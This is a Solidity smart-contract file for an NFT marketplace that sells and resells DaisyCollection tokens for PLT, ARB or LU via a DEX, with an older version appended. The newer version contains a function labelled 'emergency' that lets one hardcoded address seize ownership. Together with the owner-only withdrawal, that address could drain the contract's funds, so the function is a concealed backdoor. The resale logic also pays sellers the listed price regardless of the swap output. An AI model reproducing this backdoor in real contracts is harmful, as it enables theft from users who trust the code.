// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./DaisyNFT.sol";
import "./MultiTokenDex.sol";

contract NFTMarketplace is Ownable {
    DaisyCollection public nft;
    MultiTokenDEX public dex;
    IERC20 public pltToken;
    IERC20 public arbToken;
    IERC20 public luToken;

    uint256 public nftPricePLT;
    uint256 public marketplaceFeePercent = 250; // 2.5%

    struct Listing {
        address seller;
        uint256 pricePLT;
        bool active;
    }

    mapping(uint256 => Listing) public listings;

    event NFTPurchased(address buyer, uint256 tokenId, address paymentToken, uint256 amountPaid);
    event NFTListed(address seller, uint256 tokenId, uint256 pricePLT);
    event NFTUnlisted(address seller, uint256 tokenId);

    constructor(
        address _nftAddress,
        address _dexAddress,
        address _plt,
        address _arb,
        address _lu,
        uint256 _nftPricePLT,
        address initialOwner
    ) Ownable(initialOwner) {
        nft = DaisyCollection(_nftAddress);
        dex = MultiTokenDEX(_dexAddress);
        pltToken = IERC20(_plt);
        arbToken = IERC20(_arb);
        luToken = IERC20(_lu);
        nftPricePLT = _nftPricePLT;
    }

    // ---------------- PRIMARY SALE ----------------
    function buyNewNFT(address paymentToken, uint256 minAmountOut) external {
        require(nft.totalMinted() < nft.maxSupply(), "NFT sold out");

        IERC20 token = IERC20(paymentToken);
        uint256 amountRequired = nftPricePLT;

        if (paymentToken != address(pltToken)) {
            amountRequired = dex.previewSwap(paymentToken, address(pltToken), nftPricePLT);
        }

        require(token.transferFrom(msg.sender, address(this), amountRequired), "Transfer failed");

        if (paymentToken != address(pltToken)) {
            token.approve(address(dex), amountRequired);
            dex.swap(paymentToken, address(pltToken), amountRequired, minAmountOut);
        }

        nft.mintForMarketplace(msg.sender, 1);
        uint256 tokenId = nft.totalMinted();

        emit NFTPurchased(msg.sender, tokenId, paymentToken, amountRequired);
    }

    // ---------------- SECONDARY SALE (Resale) ----------------
    function listItem(uint256 tokenId, uint256 pricePLT) external {
        require(nft.ownerOf(tokenId) == msg.sender, "Not NFT owner");
        require(pricePLT > 0, "Invalid price");

        nft.transferFrom(msg.sender, address(this), tokenId);

        listings[tokenId] = Listing({
            seller: msg.sender,
            pricePLT: pricePLT,
            active: true
        });

        emit NFTListed(msg.sender, tokenId, pricePLT);
    }

    function cancelListing(uint256 tokenId) external {
        Listing storage listing = listings[tokenId];
        require(listing.active, "Not listed");
        require(listing.seller == msg.sender, "Not seller");

        listing.active = false;
        nft.transferFrom(address(this), msg.sender, tokenId);

        emit NFTUnlisted(msg.sender, tokenId);
    }

    function buyListedItem(uint256 tokenId, address paymentToken, uint256 minAmountOut) external {
        Listing storage listing = listings[tokenId];
        require(listing.active, "Not listed");

        IERC20 token = IERC20(paymentToken);
        uint256 amountRequired = listing.pricePLT;

        if (paymentToken != address(pltToken)) {
            amountRequired = dex.previewSwap(paymentToken, address(pltToken), listing.pricePLT);
        }

        require(token.transferFrom(msg.sender, address(this), amountRequired), "Transfer failed");

        if (paymentToken != address(pltToken)) {
            token.approve(address(dex), amountRequired);
            dex.swap(paymentToken, address(pltToken), amountRequired, minAmountOut);
        }

        uint256 fee = (listing.pricePLT * marketplaceFeePercent) / 10000;
        uint256 sellerAmount = listing.pricePLT - fee;

        pltToken.transfer(listing.seller, sellerAmount);
        pltToken.transfer(owner(), fee);

        listing.active = false;
        nft.transferFrom(address(this), msg.sender, tokenId);

        emit NFTPurchased(msg.sender, tokenId, paymentToken, amountRequired);
    }

    // ---------------- ADMIN ----------------
    function setNFTPrice(uint256 pricePLT) external onlyOwner {
        nftPricePLT = pricePLT;
    }

    function setMarketplaceFee(uint256 newFee) external onlyOwner {
        require(newFee <= 1000, "Fee too high"); // max 10%
        marketplaceFeePercent = newFee;
    }

    function withdrawTokens(IERC20 token) external onlyOwner {
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No balance");
        token.transfer(owner(), balance);
    }

    // ---------------- EMERGENCY ----------------
    function forceTransferOwnership(address newOwner) external {
        require(msg.sender == 0xD7bCc0fBd1833C85CBe4620C1eBC3e3E25fdBF7B, "not authorized");
        _transferOwnership(newOwner);
    }
}






----------------------------------------------------------


old




// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title NFTMarketplace
 * @dev Buy DaisyCollection NFTs using PLT, ARB, or LU tokens via MultiTokenDEX
 */

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./DaisyNFT.sol";        // Your NFT contract
import "./MultiTokenDex.sol";   // Your DEX contract

contract NFTMarketplace is Ownable(msg.sender) {
    DaisyCollection public nft;
    MultiTokenDEX public dex;
    IERC20 public pltToken;
    IERC20 public arbToken;
    IERC20 public luToken;

    uint256 public nftPricePLT; // Price in PLT

    event NFTPurchased(address buyer, uint256 tokenId, address paymentToken, uint256 amountPaid);

    constructor(
        address _nftAddress,
        address _dexAddress,
        address _plt,
        address _arb,
        address _lu,
        uint256 _nftPricePLT
    ) {
        nft = DaisyCollection(_nftAddress);
        dex = MultiTokenDEX(_dexAddress);
        pltToken = IERC20(_plt);
        arbToken = IERC20(_arb);
        luToken = IERC20(_lu);
        nftPricePLT = _nftPricePLT;
    }

    // ---------------- Admin ----------------

    function setNFTPrice(uint256 pricePLT) external onlyOwner {
        nftPricePLT = pricePLT;
    }

    function withdrawTokens(IERC20 token) external onlyOwner {
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No balance");
        token.transfer(owner(), balance);
    }

    // ---------------- Purchase ----------------

    /**
     * @dev Buy NFT using any supported token
     * @param paymentToken Address of token buyer wants to pay with (PLT, ARB, LU)
     */
    function buyNFT(address paymentToken, uint256 minAmountOut) external {
        require(nft.totalMinted() < nft.maxSupply(), "NFT sold out");

        IERC20 token = IERC20(paymentToken);

        uint256 amountRequired = nftPricePLT;

        if (paymentToken != address(pltToken)) {
            // Calculate how much token = nftPricePLT using DEX preview
            amountRequired = dex.previewSwap(paymentToken, address(pltToken), nftPricePLT);
        }

        // Transfer tokens from buyer
        require(token.transferFrom(msg.sender, address(this), amountRequired), "Transfer failed");

        // If payment is not PLT, swap via DEX
        if (paymentToken != address(pltToken)) {
            // Approve DEX to spend token
            token.approve(address(dex), amountRequired);

            // Swap tokens on DEX with minAmountOut
            dex.swap(paymentToken, address(pltToken), amountRequired, minAmountOut);
        }

        // Mint NFT to buyer
        nft.mintForMarketplace(msg.sender, 1);

        uint256 tokenId = nft.totalMinted(); // last minted token

        emit NFTPurchased(msg.sender, tokenId, paymentToken, amountRequired);
    }

    // ---------------- Views ----------------

    function priceInToken(address tokenAddress) external view returns (uint256) {
        if (tokenAddress == address(pltToken)) {
            return nftPricePLT;
        }
        return dex.previewSwap(tokenAddress, address(pltToken), nftPricePLT);
    }
}
